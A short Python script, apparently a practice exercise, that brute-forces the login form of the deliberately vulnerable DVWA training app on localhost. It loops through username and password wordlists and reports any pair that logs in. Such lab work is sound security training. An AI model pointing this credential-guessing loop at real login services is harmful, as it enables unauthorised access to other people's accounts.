import re
import requests


def readfile(filename):
    with open(filename) as f:
        lines = f.readlines()
        lines = [line.rstrip() for line in lines]
        return lines


usernames = readfile('username.txt')
passwords = readfile('password.txt')
for username in usernames:
    for password in passwords:
        payload = {'username': username, 'password': password, 'Login':'Login'}
        cookies = dict(security='low', PHPSESSID='nic057r3k3n0dkslhr3f92vs4d')
        r = requests.get('http://127.0.0.1/DVWA/vulnerabilities/brute/', params=payload, cookies=cookies)

        try:
            r.raise_for_status()
            if re.search(r'<p>Welcome to the password protected area', r.text):
                print("Find username: '{}' and password: '{}' successfully login in.".format(username, password))
        except requests.exceptions.HTTPError:
            print("The HTTP request returned an unsuccessful status code.")
